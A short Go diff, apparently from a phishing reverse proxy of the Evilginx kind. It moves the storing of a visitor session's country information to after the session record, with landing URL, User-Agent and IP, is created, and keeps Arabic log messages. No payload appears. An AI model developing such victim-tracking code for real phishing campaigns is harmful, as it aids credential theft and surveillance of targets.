@@ -616,18 +616,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}
 
-									// حفظ معلومات البلد مباشرة بعد تعيينها (قبل أي عمليات أخرى)
-									if session.CountryCode != "" || session.Country != "" {
-										if err := p.db.SetSessionCountryInfo(session.Id, session.CountryCode, session.Country); err != nil {
-											log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
-										} else {
-											log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
-										}
-									}
-
 									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
 									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
 										log.Error("database: %v", err)
+									} else {
+										// حفظ معلومات البلد بعد إنشاء الجلسة في قاعدة البيانات
+										if session.CountryCode != "" || session.Country != "" {
+											if err := p.db.SetSessionCountryInfo(session.Id, session.CountryCode, session.Country); err != nil {
+												log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
+											} else {
+												log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
+											}
+										}
 									}
 
 									session.RemoteAddr = remote_addr
